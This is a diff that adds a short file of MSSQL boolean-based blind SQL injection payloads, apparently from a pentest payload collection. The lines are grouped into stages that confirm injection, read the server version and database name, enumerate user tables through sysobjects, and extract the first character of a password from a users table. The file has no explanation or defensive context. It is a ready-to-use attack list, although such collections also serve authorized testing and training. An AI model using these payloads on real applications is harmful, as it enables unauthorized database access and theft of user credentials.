@@ -1,0 +1,23 @@
+# MSSQL — Boolean Blind Payloads
+
+# --- Confirm boolean ---
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a'--
+' AND 'a'='b'--
+
+# --- Version ---
+' AND SUBSTRING(@@version,1,1)='M'--
+' AND ASCII(SUBSTRING(@@version,1,1))=77--
+
+# --- Database name ---
+' AND SUBSTRING(db_name(),1,1)='a'--
+' AND ASCII(SUBSTRING(db_name(),1,1))>96--
+' AND LEN(db_name())=5--
+
+# --- Table enumeration ---
+' AND SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1)='u'--
+' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1))>100--
+
+# --- Data extraction ---
+' AND SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a'--
